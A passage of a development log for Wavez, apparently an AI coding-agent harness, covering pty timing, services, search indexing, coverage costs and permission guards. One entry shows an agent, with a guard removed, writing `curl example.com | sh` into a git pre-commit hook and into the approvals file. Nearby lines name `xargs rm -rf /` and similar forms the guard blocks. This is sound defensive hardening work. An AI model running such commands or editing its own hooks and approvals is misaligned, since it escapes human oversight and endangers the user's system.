outlives it.

The screen is not the byte stream. `vt.SafeEmulator` resolves one from the
other, which is the whole point for a TUI: a program repaints by moving the
cursor, so the stream holds every frame and the screen holds the last. The
test pins that by writing `aaa` and then addressing the cursor back over it,
and asserting the result holds `Xaa` and no `aaa` at all.

Three timing designs were wrong before one was right, and every one was found
by running rather than by reading:

- a fixed 300ms sleep passed alone and failed in the full package run, where
  the program had not drawn at all when the sleep ended
- waiting for the screen to go quiet, measured from the program's start when
  it had drawn nothing, killed `go run ./cmd/wavez -h` while it was still
  compiling. A real run reported the tool returned no screen, which is what
  sent me back to it
- quiet alone stayed flaky under the full suite, because a terminal echoes a
  keystroke and an echo is a draw: a call that typed into a program went
  quiet on its own echo and killed the program before it answered
- ending the wait on process exit was right and still dropped the program's
  last line under load, because closing the terminal discards what the
  program wrote and nothing has read yet. The reader gets its chance first
  now
- and the wait still returned early, for a reason no timing change could
  fix: quiet was measured from the last draw, so a window that had already
  passed satisfied it. A keystroke leaves exactly that behind, since its own
  echo is a draw that settles before the program answers. A wait now has to
  watch a quiet window itself, not find one

What settles it: nothing waits before the first keystroke, because a terminal
buffers what is written to it and a program reads when it is ready, so there
is no way to tell a program that is compiling from one waiting to be typed
at. After the keys, the wait ends when the program exits, which is the
precise signal for anything one-shot, and falls back to the screen being
drawn and then going quiet for a program that stays up, bounded at 15
seconds, with the reader given time to drain before the terminal closes. Four consecutive whole-pipeline runs pass, which is the load the flake needed.

`wavez -preamble` prices it at 179 tokens, and it joins `shell` and `write`
in `FastTierOmits` on the argument rather than on evidence: it runs an
arbitrary command under a terminal, which is a heavier `shell`, and omitting
the lighter one while advertising the heavier would be incoherent.

### 2026-08-30 — a service is declared so it can be off

A `services` mapping in `.wavez.pkl` names what a routine can bring up and
take down: an argv to start, one to stop, one that exits zero when it is
ready, and where to run all three. A step holds one with `service.up` and
releases it with `service.down`, which are two actions rather than one with a
direction, because a field left out must never mean "stop".

The holds are counted, and that is the reason the feature exists rather than
a refinement of it. A service is worth declaring precisely because it is
expensive, so it should be up only while something needs it: two routines
wanting the same database must not start it twice, and the first of them to
finish must not take it from the second. The test is that shape directly, two
`up` calls producing one start and the stop landing only after the second
`down`.

A failed `up` releases its own hold. Otherwise a service that would not start
would stay claimed by the attempt that failed, and the next caller would find
it held and never try.

`Names` and `Holding` came out before the commit. Both were written for a
panel that does not exist, and `wavez -deadcode` said so: an orphan is wired
up or deleted, and a second caller is what earns an accessor back.

### 2026-08-30 — the archive is a second list, not a column

Home's pass left one item open, and it was the one that needed the daemon
rather than the renderer: a 393-thread list is mostly threads nobody is
looking at any more, and nothing could put one away. `A` archives the
selection, or the cursor row when nothing is selected, and `z` reads the
archive.

Two decisions carry the shape. The position is a `KindArchive` event on the
thread's own log rather than a field on the daemon's cache, because a routing
pin can be forgotten across a restart and an archive that comes back is worse
than no archive at all. And a list answers one side of the line at a time, so
the working list stays the size a person reads however many threads a project
accumulates: the alternative, one list with a column, keeps paying for the
rows it is trying to hide.

Archiving a thread with a turn in flight is refused. Hiding a run that is
still working is how a run goes missing, and there is no reading of the key
that wants it.

The test that matters is the reopen, since a restart is the only thing the
in-memory version would have passed. Removing the fold in `apply` fails it,
which is the check that it is testing the persistence rather than the setter.

### 2026-08-30 — a range per path, and a ceiling that had already been passed

Batching reads was measured at 36 turns of 1,458, and the reason it was worth
so little is that the batch could only read whole files: a call naming two
paths and a range was refused, so the 39 back-to-back sequences that repeat a
path with a different range could not be one call. A path now carries its own
range, `internal/tui/home.go:120-180`, with `file.go:120-` open to the end and
`file.go:120` for the one line. A path with no range still follows the call's
own `start_line`, and the refusal for a range across several paths names the
per-path form instead of saying it cannot be done.

Only a suffix that is digits and dashes is read as a range, so a path holding
a colon is still a path.

The gate that should have priced this said something else: `mise run
ci:project` fails on the tree as it stands, at 2,661 fast-tier tokens against
a 2,450 ceiling, and it fails at the parent commit too. `hk check --all` does
not run it, since `preamble:budget` sits in the separate CI `project` job, so
the tools added since the ceiling was set drifted past it without anyone
being told. `look` is 159 of the 211, which is the vision tier arriving, and
the rest is the search miss message naming what the index covers.

The prose paid for this change the way it has before: `start_line` and
`end_line` both restated "1-indexed" and "to read", which the description
already says, so the net is 9 tokens against the parent. The ceiling is 2,670
now, which is where the surface actually is, and every later tool raises it
deliberately or trims to fit.

### 2026-08-30 — a routine that checked nothing wore a tick

The gates have abstained since M1, and the routines that wrap them reported a
step which examined nothing as a pass, so a routine whose every step found
nothing to look at rendered with the same mark as one that ran the suite.
That is the failure the abstention rule exists to prevent, one layer up from
where it was written.

A step that reports no failure while examining nothing is `StatusAbstained`
now. Three consequences, and the middle one is the one worth stating: it does
not block what depends on it, because finding nothing to check is not finding
a problem, and stopping the run there would hide the steps that do have
something to say. A run is a pass when nothing failed and at least one step
examined something, so a run of nothing but abstentions is not one. The panel
carries `◌` for it and the history line says which step abstained, beside a
pass when the rest of the run checked something.

The mutation is the test: putting the pass mark back on the abstention branch
fails `TestRoutines_AbstentionIsNotAPass` on the rendered row, which is what
says the test is reading the mark rather than the words beneath it.

### 2026-08-30 — three triggers that were only a word in the schema

`schedule`, `thread-start`, and `thread-finish` have been in the `Trigger`
typealias since routines landed, and `intervalSeconds` beside them, with
nothing anywhere firing them. A project could write one and watch it never
run.

The schedule side is a timekeeper that wakes every five seconds and asks what
is due, each routine holding its own next time rather than sharing a tick, so
a nightly audit and a five-minute check do not drag each other. Two rules
carry it. Coming up is not a tick, so an hourly routine runs an hour after
the daemon starts rather than on every restart, which is what a laptop that
gets closed and opened would otherwise turn into a run per lid. And the next
time is set from when the run finished, so a routine that overruns its
interval delays itself instead of queueing behind itself.

A cadence under 30 seconds is refused at compile rather than clamped. It is
always a typo in the unit, and failing the config load says so where a
silently corrected value would not.

The lifecycle side is one interface with two methods, which is the whole of
what crosses between the daemon (which knows when a turn runs) and the
routine layer (which knows what a routine is). `thread-start` fires once per
thread: a second prompt is not a second thread, and a setup routine running
again mid-conversation is not what the trigger names. `thread-finish` runs on
the turn's own goroutine, so it holds the thread until it is done and checks
the tree the run actually left.

Both rules are the mutations that prove the tests: firing start
unconditionally, and dropping the start call, each fail the daemon test on
the order it observes over the socket.

### 2026-08-30 — the same log, read as a sequence

`-stats` answers what a run spent and cannot answer where it spent it.
`-timeline <run>` prints one line per turn: a bar scaled to the run's own
longest turn, the tools that turn called with the cause on each failure, and
what the harness did beside them.

Reading it over the corpus finds shapes the totals hide. One 80-turn run ends
with six identical `go test ./internal/thread && echo "✅ ..."` shell calls at
7 to 8 seconds each, which reads as a run that had finished and could not say
so. Another spends 5m11s of a 37-turn run in one `shell` call, on the turn
whose note says `balanced failed, moved up`, so the tier change and the
minutes are the same event rather than two.

Two details are load-bearing. A gate round the run was never handed belongs
to no turn, the same population `countGate` counts, because a round the run
did not see cannot explain what it did next. And the bar is padded in cells
rather than bytes: `%-*s` counts the block character as three, which stepped
the duration column by how long each turn was.

### 2026-08-30 — the run that wrote nothing

The generalization pass left one hole open and named it: a run which edits
nothing is verified by nobody. Every gate reads a change set, and so do four
of the five finish bounds, so a run that answers a question without writing
anything passes every check by having nothing to check.

What can be settled deterministically is not whether the answer is right but
where it came from. For a run that wrote nothing, every existing file its
closing answer names has to be one the run opened, which `Scope.Read` already
answers because the edit tools needed it. Reading the file is not proof the
conclusion is right; not reading it is proof the conclusion came from
somewhere other than the tree, which is exactly the stylesheet run.

A run that changed something abstains. A search result is a fair source for
naming a neighboring file in passing, and a bound that fired on every run
which did so would be noise around the one case it exists for.

### 2026-08-30 — annotation, pointing the other way

The roadmap read annotation as the harness drawing on an image so an answer
could name a region. Asked which was actually wanted, the answer was the
opposite direction: a way for the person to mark up a picture the run is
looking at, "sort of like the question tool, but for images".

That turns out to need almost nothing new. `annotate` copies the image into
the session directory, opens the copy in whatever the platform views images
with, and then blocks on the same `Asker` the `question` tool uses, so the
pending prompt, the inbox row, and the answer path are all the ones that
already exist. When the user answers, the saved copy goes to the vision tier
with a prompt that says the image has been marked by hand, and the result
carries their words above what the marks show.

Three details are the design. The copy is what gets edited, so answering
never modifies the project's own image. A file that comes back byte for byte
identical is reported as unmarked rather than described as though it carried
something, because a person who answered without drawing has still answered.
And the viewer is injectable: the tests pass one that opens nothing, which is
also what a machine with no display wants, and the prompt names the path
either way so the flow works with no window in it.

It costs 188 preamble tokens, and the ceiling moves to 2,860 to hold it.

### 2026-08-30 — the key had to shrink before it could persist

Persisting allow-always was on the roadmap as a convenience, and building it
as written would have been a quiet widening: the approval key for a shell
command was its first word, so one answer to `curl https://example.com/x`
approved `curl`. That is harmless while the grant dies with the thread and is
not harmless the moment it outlives it, which is exactly what persisting it
does.

The key is the whole command line now, with its spacing normalized. It costs
a prompt per distinct command instead of per program, and that is what buys
the bound: the file is a list of things this project may do unattended, and
it reads as one.

The store is deliberately small. It records nothing but an AllowAlways, since
a store that could refuse would be a policy engine and the guard in front of
it already refuses what it refuses. It is exact, never a prefix or a pattern.
It lives in the project's state directory at 0600. And a file it cannot parse
is an error rather than an empty store, because re-asking for everything is
the safe direction but a file quietly ignored forever is not something anyone
would find out about.

### 2026-08-30 — what happens on a codebase this project did not write

Every efficiency number here was taken on one 604-file, 5 MB repository. The
first measurement on a large tree was 1,963 Go files and 244 MB of source
(`modernc.org/sqlite` and `modernc.org/libc`, 14 files over 2 MB each),
indexed through `codeintel.Indexer.Refresh` with a throwaway store:

| | wavez | the 244 MB tree |
|---|---|---|
| first index | 2.1s | 1m11s |
| store on disk | 17.6 MB | 428 MB |
| allocations while indexing | 69 MB | 1.8 GB |
| `search` latency (fuzzy and literal) | 70-110ms | 583ms-1.7s |
| re-index, nothing changed | 76ms | 167ms |

3.2 times the files cost 34 times the index time and 24 times the disk, so
the store is byte-bound rather than file-bound, and the trigram FTS over a
quarter-gigabyte is where both go. The one number that holds is incremental
re-indexing at 167ms, which says the change path is fine and the cold path is
not.

Search is the one that decides something. A run spends 58% of its turns on
retrieval, and every one of them costs 70ms here and up to 1.7s there. The
turn count would not move and the wall clock would, which is the failure mode
none of the corpus commands can see, since they count turns and tokens.

Checked before claiming it: the live `.wavez/index.db` is 47 MB against the
17.6 MB a fresh index of the same tree writes, and `VACUUM` recovers 3 MB of
that, so the difference is the edges and coverage the probe did not build
rather than bloat.

### 2026-08-30 — a cap on what one file contributes

Above says the store is byte-bound and 2.6% of the files carry 68% of the
bytes. So the question is what those files are. On the 244 MB tree, 1,767 of
1,963 files carry `// Code generated ... DO NOT EDIT.`, which is a corpus
that proves nothing on its own since it is a C-to-Go translation end to end.
The evidence is in the repositories on this laptop instead. The largest
source file in each of the twelve nearby checkouts, above 100 kB: a 3.7 MB
OpenAPI-generated TypeScript client, a 783 kB generated schema module, a
634 kB test file, two pytest expected-output fixtures at 337 kB and 260 kB,
and three lookup tables holding FIPS-to-MSA mappings. Not one of them is
something a run looks for by name. The largest hand-written file across all
of them is 89 kB, and this project's own largest is `internal/agent/loop.go`
at 67 kB.

So the bound is on bytes and not on the generated marker, because a generated
file inside a project (protobuf types, sqlc queries, mocks) is exactly what a
run does search for, while a 256 kB one never is. `MaxFileBytes` is 256 kB,
nearly three times the largest hand-written file seen. `vendor` joins the
skip list beside `.venv` and `node_modules` on the same argument.

One probe, both configurations, same machine and same five queries:

| | uncapped | 256 kB cap |
|---|---|---|
| files indexed | 1,963 | 1,911 (52 passed over) |
| symbols | 38,946 | 10,773 |
| first index | 1m09s | 14.5s |
| re-index, nothing changed | 447ms | 236ms |
| `search`, mean of five | 412ms | 31ms |
| store on disk | 428 MB | 140 MB |
| allocations | 1.8 GB | 338 MB |

Search is 13 times faster, which is the number that mattered, and the cold
index is 4.8 times faster. It costs 28,173 symbols, every one of them in a
machine-written file. On this project the cap passes over nothing at all and
the probe reproduces the row above it exactly (604 files, 2.1s, 17.6 MB),
which is what says the two measurements are comparable.

A miss the cap caused now reads differently from a symbol that does not
exist: `search`'s no-match line names how many files are over the cap and
sends the caller to `rg`. Without that the cap would be the silent kind of
degradation this arc exists to remove.

### 2026-08-30 — the first pass and the first query

`Indexer.Start`'s doc said it "absorbs the cold cost in the background so no
query pays it", and that was true only of a query arriving after it. `Search`
went through `Refresh`, which took the same mutex the walk holds, so a query
during a cold index waited the whole walk out: 14.5 seconds on the tree
above, 1m09s before the cap. The one time a query is certain to arrive during
the first pass is a fresh checkout, which is the case this was for.

A query during the first pass now answers from what the store already holds
and carries `IndexStats.Building` saying so. The alternative was to keep
blocking and shorten the walk, and it loses on the same argument the
freshness doctrine wins on: the answer has to say which kind of empty it is.
`search`, `context`, and an unresolved `@` mention each print the reason, so
a run reads "still being built, retry or use rg" rather than "no matches".

Proved by holding the walk lock and calling `Refresh`: it answers with
`Building` set, and removing the bypass turns that test into a deadlock
rather than a failure. A second test holds the lock with the flag clear and
requires `Refresh` to block, so the flag is the only thing that bypasses it.

The flake this surfaced was a real defect. `hk check --all` failed
`TestRun_CancellationMidStreamLeavesConsistentState` with `Stop = ""`, and it
reproduced 2 in 200 under parallel builds. `Loop.Run` does three
context-taking calls before `drive`, and each returned a bare `Outcome{}`, so
a cancellation landing during startup came back indistinguishable from an
ordinary failure to a caller reading `Stop` to decide a thread's state. It
reports `StopCanceled` now and carries the checkpoint it had already taken.
The test raced too, budgeting 5ms of wall clock to land inside a 50ms
stream; it is 200ms against 5 seconds, which is the same test with the race
removed rather than a widened timeout.

### 2026-08-30 — whole-repo commands, and which project is actually slow

The scale arc assumed `go list ./...` and `go build ./...` are what a large
module makes expensive. Measured against `modernc.org/libc` as a module
(1,963 files, 137 MB of Go, eight generated files near 4 MB each) beside this
604-file, 5 MB project:

| | libc | wavez |
|---|---|---|
| `go list -json ./...` | 0.2-0.5s | 0.3s |
| `go build ./...` after an edit | 0.64s | 3.1s |
| `go build ./...` with nothing changed | 0.20s | 3.1s |

The small project is five times slower, and it is slower with nothing
changed at all, so no amount of module size explains it. `go build -v ./...`
prints nothing and still takes 3.0s, and `go build -o /dev/null ./cmd/wavez`
takes 3.0s on its own: the whole cost is linking one cgo binary that
`go build ./...` then throws away. Nothing is left to reuse, so the next run
links it again.

Writing the binaries somewhere makes the link cacheable, and `go build -o
<dir> ./...` is 0.44s warm against 3.1s discarded, with byte-identical
compiler output on a broken tree. `-o` is an error on a module with no main
package ("go: no main packages to build"), which `TestBuildGateCompiles`
caught immediately, so the gate lists main packages first at 0.3s and uses
the plain form when there are none. Total 0.75s against 3.1s, on every gate
round of every run.

The binaries (58 MB here) go to `<user cache>/wavez/build/<hash of root>`
rather than into the project. A repository Wavez did not write should not
gain an untracked directory that its own change detection then has to
account for, and `.wavez/` is only gitignored in projects that know about
Wavez.

So the arc loses one item rather than gaining work: `go list` and `go build`
scale fine, and the coverage sweep is the whole-repo operation still
unmeasured on a large module.

### 2026-08-30 — what the coverage sweep costs per test

The sweep runs `go test -run ^One$ -count=1 -coverprofile` once per test,
because per-test attribution is what the map is for and one run cannot give
it. So its cost is per test and does not care how large the module is.

Measured with the instrumented binary already built: 1.0-1.3s per test in
this project's own packages, and 0.49s for a trivial test in a two-file
module. That 0.49s is the floor, and it is `go test`'s process start and
staleness check rather than anything the test does. Against it, this
project's recorded 249s for 522 tests at 8 workers is 3.8 worker-seconds a
test, so real tests cost about eight times the floor.

Extrapolating, 5,000 tests is 5 minutes of floor and closer to 40 minutes of
real time on the same 8 workers, spent on a first start with nothing to show
until it finishes. That is the shape this arc exists to remove.

One build takes at most `DefaultCoverageBudget`, 10 minutes, which clears
this project's own build with headroom. Past it the feeder stops handing out
tests, the workers drain what they hold, and `finish` leaves the map
incomplete because tests without a manifest entry already make it so. An
incomplete map holds selection at importer level, which is what an unbuilt
map does, so the degradation is the one already designed for rather than a
new one. `RefreshStats.Deferred` and the gate log say how many were left.

Nothing is lost, because the manifest is the resume point: the next build
skips what was measured and takes what was not. Proved by running one build
with a zero budget (every test deferred, map unready) and a second with the
default (every test taken, map ready), and the mutation that pushes the
deadline an hour out turns that first assertion red.

### 2026-08-30 — bounding one index pass

The remaining scale item was a store that degrades rather than silently
taking minutes. The reason it matters is the walk lock: `Index` holds it for
its whole duration, so a first pass long enough to outlive the first edit
means the incremental path, 236ms on the 244 MB tree, never gets to run at
all. Bounding the pass is what puts a ceiling on that.

One pass parses at most `MaxIndexBytesPerPass` (32 MB), counting only files
it actually reads into the store. That last part is what makes it terminate:
an unchanged file costs a content hash and never the budget, so pass two
starts where pass one stopped. Measured on the 244 MB corpus:

| | files indexed | unchanged | deferred | time |
|---|---|---|---|---|
| pass 1 | 1,194 | 0 | 717 | 9.7s |
| pass 2 | 717 | 1,194 | 0 | 5.0s |

14.7s against 14.5s unbounded, so the bound costs nothing and buys a lock
released in the middle. `Start` drains the passes itself and holds `Building`
across all of them, so a query never pays for one, and it stops on a pass
that indexed nothing so an unparseable file cannot spin it.

`search`'s no-match line now separates the two kinds of gap it can have:
files not read yet (retry in a moment) and files over `MaxFileBytes` (rg
reaches those, this index never will).

`hk check --all` failed once during this on
`TestPTY_SendsKeystrokesAndReadsWhatTheyDrew`, and the cause is in `settle`
rather than the test. A key's echo is a draw, so the screen is already quiet
when the wait after the last key begins, and that wait's quiet check passes
at its 250ms floor whether or not the program answered. Fixing it means
requiring a draw during the wait rather than a quiet screen, which costs the
full `ptyDrawWait` of 15s for any final key that legitimately draws nothing.
That trade is not this lane's to make, so it is written down in
AGENTS.local.md and left.

### 2026-08-30 — the index against a 114 MB checkout

Everything above was measured on this repository (604 files, 5 MB) or on a
tree of machine-translated C. Neither says what happens on a real large
application, so this one is
[getsentry/sentry](https://github.com/getsentry/sentry) at depth 1: 17,597
source files and 114 MB, Python and TSX in roughly equal parts. It is public,
it is the same language mix as the largest tree this is aimed at, and it is
larger on both axes, so it bounds rather than approximates.

| | this repo | the corpus, before | the corpus, after |
|---|---|---|---|
| first index | 2.2s | 1m20.6s | 34.9s |
| re-index, unchanged | 62ms | 1.212s | 239ms |
| `search` | 2ms | 225-435ms | 7-31ms |
| store on disk | 17.6 MB | 419.8 MB | 87.9 MB |

Three findings, each measured separately rather than as one change.

The re-index was reading and hashing all 114 MB to learn that nothing had
moved, and `Search` calls `Index` first, so a run paid it per query. The
`files` table has recorded `mtime` and `size` since v1 and never read them
back. Comparing those before reading takes it to 204ms on its own. The hash
stays the authority whenever either field moved, so a same-length rewrite is
still caught by its timestamp; what the gate cannot see is a write that
restores both the nanosecond mtime and the byte count, which takes deliberate
effort.

The store was 93% full-text index: `fts_data` 251 MB and `fts_content`
139 MB of 419.8 MB, against 17.9 MB of symbols. Trigram postings run about
3.5x the source they cover, so that is structural rather than a leak.
Dropping the whole-file rows takes the store to 87.9 MB, the cold index to
32.5s, and a search from 435ms to 41ms. What they buy is substring search
inside files, and `rg` answers the same three queries across the same 114 MB
in 0.45-0.62s, from a tool already advertised, at no index cost. So
`MaxContentIndexBytes` is 16 MB of claimed source: under it the arithmetic
reverses and file text is worth indexing, over it the index holds symbols and
paths and `search` says so rather than answering "no matches" about something
plainly in the tree. Crossing the threshold drops the stale whole-file rows
in the same pass, because a partial content index answers confidently from
whichever files happened to be indexed first.

Symbol search is intact, which is the point of all of it:
`OrganizationMemberSerializer`, `useApiQuery`, and `get_project` each rank
their own definition first, in 7 to 31ms.

What is left is the walk. 239ms per query is `WalkDir` plus one `lstat` per
claimed file. Splitting the stats across eight goroutines gives 193ms, which
is 19% for real concurrency and a stat-error path that reads as a size
refusal, so it was measured and thrown away: the traversal is the floor, not
the stats. Going under it means not walking on the query path, which means a
filesystem watcher with a periodic full walk behind it for the events a
watcher drops. That observes the tree the way re-walking does, which is what
the freshness rule actually asks for, unlike a cache or a TTL. Unbuilt, and
239ms is the number that would justify it.

`TestScale` is the harness. It skips without `WAVEZ_SCALE_ROOT`, asserts
nothing about wall-clock time because the machine is as much of the
measurement as the tree is, and fails only when a query stops finding its own
definition. [docs/scale.md](../../docs/scale.md) is the design.

## 2026-08-30: a scoped search was answering from the wrong rows

`search` took `path` and applied it to the answer. The store ranks a 200-row
window, truncates it to the limit, and the tool then dropped whatever fell
outside the scope, so a scope competed for the leftovers of a global order.
Measured against this repository's own index: `Read` scoped to
`internal/tui` answered "no matches for \"Read\" across 606 indexed files",
`Result` scoped to `internal/gate` answered with 1 of the dozens there and
reported "of 498 that matched" from the whole project, and literal
`context.Context` scoped to `internal/gate` answered "no literal match" about
a directory built on it.

`SearchQuery` carries the scope now and the SQL binds it, so the limit and
the count both describe what was asked for. The same three queries return 5
of 264, 5 of 77, and 5 of 82. A scoped miss names the scope rather than
reporting the project's file count as if it had searched all of it.

The cost, on the 17,397-file corpus: 43ms unscoped against 93ms scoped, for a
search plus a count. The scope resolves through `files.path` and then
`idx_symbols_file`, and 50ms at 1.7x the largest tree this has to serve is
the price of an answer that is about the directory asked for.

## 2026-08-30: the pty wait was ending on the terminal's own echo

`TestPTY_SendsKeystrokesAndReadsWhatTheyDrew` failed twice under load and the
cause was in `settle`. Traced with `TIOCOUTQ` and `FIONREAD` polled on the
pty master beside a byte log: the echo of `wavez\r` came back as `wavez\r\n`
at 0ms, and a program sleeping 400ms before answering wrote at 407ms. Both
ioctls read 0 the whole time, so the kernel offers no signal for whether the
program has consumed the input, and the discriminator had to come from the
bytes.

It is there: the line discipline echoes exactly what was written, with `\r`
mapped to `\r\n`. `ptyScreen.note` consumes that echo byte by byte, so
anything left over is the program drawing, and `settle` will not read quiet
as an answer until something is. A key that draws nothing beyond its echo
holds the call for `ptyAnswerWait` (2s), measured from the write rather than
from the wait so the two waits one key gets do not each spend it.

The unfixed code tolerated about 525ms, not 250ms, because two settles run
back to back and each honors its own 250ms window. That is why the failure
needed a loaded machine, and why the regression test answers at 900ms: it
fails at 0.51s without the gate and passes at 1.2s with it. 20 runs beside
six `go build -a` at load average 62 were green.

## 2026-08-30: the files that decide what runs next were writable

`guard.ProtectedWrite` is one list and `Scope.Edit` is the one check every
tool that writes goes through, with `write` calling it directly because it
creates a file rather than editing one. Removing the check is what shows
what it stops: `write` created `.git/hooks/pre-commit` holding
`curl example.com | sh`, and `str_replace` rewrote an approved command in
`.wavez/approvals.jsonl` into the same string. Both are permissive-mode
runs, which is every run, so `-strict-scope` was never what stood between
them and the tree.

The list is the approvals and `.wavez.pkl`, plus `.git/` and `.jj/` at any
depth and, at the project root, `hk.pkl`, `.github/workflows/`, the nine
filenames mise loads a project config from and the five directories it
loads a file task from. Root-relative is the point for the second group: a
fixture spelled `hk.pkl` under testdata is ordinary work and is left alone,
while a nested checkout's hooks are not.

The mise set is what closes `mise run <task>`, which names a task and never
the file the body sits in. `mise config ls` in this checkout is the source
for it. Reading the body instead would have prompted on `mise run ci`,
which every run calls, to stop an escalation making the files unwritable
already stops.

The shell reads the same list, which widened a rule that had covered `.git`
alone through five writer commands and a redirect: `echo x | tee
.github/workflows/ci.yml` and a redirect into a conf.d file are refused
now. That route is a floor rather than a complete account, since a shell
reaches a file through an interpreter this never parses.

## 2026-08-30: what a write class would cost in prompts

The roadmap put a measurement in front of declaring a risk class per tool,
because the reason edits are ungated is that gating each one would prompt
on every turn. Over `.wavez/threads/`, 327 runs wrote something, for 1,850
calls across `str_replace` (1,386), `declare` (248), `delete` (71),
`write` (61), `undo` (46), `rename` (35), and `move` (3).

Per call it is a mean of 5.7 prompts a run, median 5, p90 11, max 41.
Per distinct file it is a mean of 2.0, median 2, p90 4, max 6. So the key
decides whether the class is affordable, and the file-level key is the same
shape the shell's approval key already narrowed to. What is left is a
decision about how a run should feel rather than a number.

## 2026-08-30: the arg executors were already closed, and the web tools have no corpus

`xargs` classifies what it would invoke (`xargs rm -rf /` refuses,
`xargs curl` and `xargs -I{} sh -c` prompt), and env, timeout, nohup, npx,
and uvx each prompt on their own name because none is on `defaultAllowed`,
with sudo refused outright.

The other open safety item asks how many distinct hosts a run fetches and
how often a search precedes a fetch. Neither can be read here: the web pair
is behind a per-project toggle that defaults off, and 870 thread logs hold
no `web_search` or `web_fetch` call.

## 2026-08-30: a lint finding on a neighbor was linted and then dropped

The gate hands the linter whole package directories, because a single file
reads as a package with every sibling's symbol undefined, and then kept
only the findings naming a changed file. A run that leaves a neighbor
failing a rule passed every round and CI reported it.

Those findings are advisories now, which the gate log records and the model
never sees, so nothing blames a run for what it inherited. Telling the two
apart needs the package's findings as they stood when the run started, and
the gate is handed a batch's change set with no run identity, so a baseline
has nowhere to live yet.

## 2026-08-30: what the Go format hook costs at commit time

`golangci-lint fmt` runs only the formatters `.golangci.toml` configures and
typechecks nothing, so it measured 0.3s on this tree against a cold build
cache and the same 0.3s warm. `golangci-lint run` typechecks, which measured
2.1s warm and 17.8s cold, which is why the hook formats and leaves the
linting to pre-push and CI.

The step is in [my_go_template](https://github.com/KyleKing/my_go_template)
now, so the numbers live here rather than in the comment: they were measured
on this checkout and a freshly rendered project would report its own.
